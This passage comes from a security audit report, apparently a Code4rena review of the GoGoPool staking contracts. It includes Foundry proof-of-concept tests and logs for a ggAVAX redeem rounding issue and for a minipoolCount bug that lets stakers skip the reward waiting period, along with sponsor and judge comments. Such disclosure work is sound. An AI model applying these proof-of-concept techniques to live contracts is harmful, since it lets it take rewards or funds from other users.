class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syncRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxRedeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TotalReleasedAssets after syncRewards:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalReleasedAssets</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LastRewards after syncRewards:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lastRewardsAmt</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bob maxRedeem():&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bob PreviewRedeem() after skip to the cycle end:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">previewRedeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeemAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maxRedeemSharesBob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testRedeemUnderOverFlow() (gas: 1244356)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Rewards amount: 200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  TotalReleasedAssets after syncRewards: 1200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  LastRewards after syncRewards: 85</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bob maxRedeem(): 1200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bob PreviewRedeem() after skip one day: 1206</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  TotalReleasedAssets after syncRewards: 1285</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  LastRewards after syncRewards: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bob maxRedeem(): 1200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bob PreviewRedeem() after skip to the cycle end: 1285</span></span></code></pre>\n<h3 id=\"tools-used-13\" style=\"position:relative;\"><a href=\"#tools-used-13\" aria-label=\"tools used 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools used</h3>\n<p>Foundry/VsCode</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider redeem the max available amount for the shares owner instead of revert. The <code>maxRedeem()</code> function amount is not the same as the <code>previewRedeem()</code> amount.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/317#issuecomment-1385070739\">emersoncloud (GoGoPool) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is a known issue that we don’t intend to fix. The issue is most likely to present itself at the very start of the ggAVAX and not during typical operation. There’s a bit more explanation here: <a href=\"https://github.com/fei-protocol/ERC4626/issues/24\">https://github.com/fei-protocol/ERC4626/issues/24</a></p>\n<p>I don’t believe redeeming max available is an appropriate solution because the spec for redeem reads</p>\n<blockquote>\n<p>MUST revert if all of shares cannot be redeemed (due to withdrawal limit being reached, slippage, the owner not having enough shares, etc).</p>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/317#issuecomment-1409217179\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a scenario in which <code>maxRedeem</code> can revert.</p>\n<p>While this can be attributed to rounding errors, it ultimately is possible for certain depositors to lose marginal amounts of their rewards or principal.</p>\n<p>Because of the reduced impact, I agree with Medium Severity.</p>\n<p>This is a hedge case that has been argued to have happened very rarely, and for this reason, I maintain that the severity is Medium, but can agree with a nofix, as the worst case will require the Sponsor to offer a small amount of additional token, to allow the last withdrawer to maxRedeem.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-minipoolmanager-recordstakingerror-function-does-not-decrease-minipoolcount-leading-to-too-high-ggp-rewards-for-staker\" style=\"position:relative;\"><a href=\"#m-19-minipoolmanager-recordstakingerror-function-does-not-decrease-minipoolcount-leading-to-too-high-ggp-rewards-for-staker\" aria-label=\"m 19 minipoolmanager recordstakingerror function does not decrease minipoolcount leading to too high ggp rewards for staker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/235\">[M-19] MinipoolManager: <code>recordStakingError</code> function does not decrease <code>minipoolCount</code> leading to too high GGP rewards for staker</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/235\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/870\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/861\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/763\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/666\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/644\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/603\">sk8erboy</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/590\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/511\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/504\">Allarious</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/326\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/274\">kaliberpoziomka8552</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/253\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/188\">Saintcode_</a></em></p>\n<p>The <code>MinipoolManager.recordStakingError</code> function (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515</a>) does not decrease the <code>minipoolCount</code> of the staker.</p>\n<p>This means that if a staker has a minipool that encounters an error, his <code>minipoolCount</code> can never go to zero again.</p>\n<p>This is bad because the <code>minipoolCount</code> is used in <code>ClaimNodeOp.calculateAndDistributeRewards</code> to determine if the <code>rewardsStartTime</code> of the staker should be reset (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84</a>).</p>\n<p>Since the <code>minipoolCount</code> cannot go to zero, the <code>rewardsStartTime</code> will never be reset.</p>\n<p>This means that the staker is immediately eligible for rewards when he creates a minipool again whereas he should have to wait <code>rewardsEligibilityMinSeconds</code> before he is eligible (which is 14 days at the moment) (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51</a>).</p>\n<p>To conclude, failing to decrease the <code>minipoolCount</code> allows the staker to earn higher rewards because he is eligible for staking right after he creates a new minipool and does not have to wait again.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I have created the following test that you can add to the <code>MinipoolManager.t.sol</code> file that logs the <code>minipoolCount</code> in the <code>Staking</code>, <code>Error</code> and <code>Finished</code> state.</p>\n<p>The <code>minipoolCount</code> is always <code>1</code> although it should decrease to <code>0</code> when <code>recordStakingError</code> is called.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingErrorWrongMinipoolCount</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;INVALID_NODEID&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// minipool count when in &quot;Staking&quot; state: 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingError</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// minipool count when in &quot;Error&quot; state: 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finishFailedMinipoolByMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1finished</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// minipool count when in &quot;Finished&quot; state: 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-14\" style=\"position:relative;\"><a href=\"#tools-used-14\" aria-label=\"tools used 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" 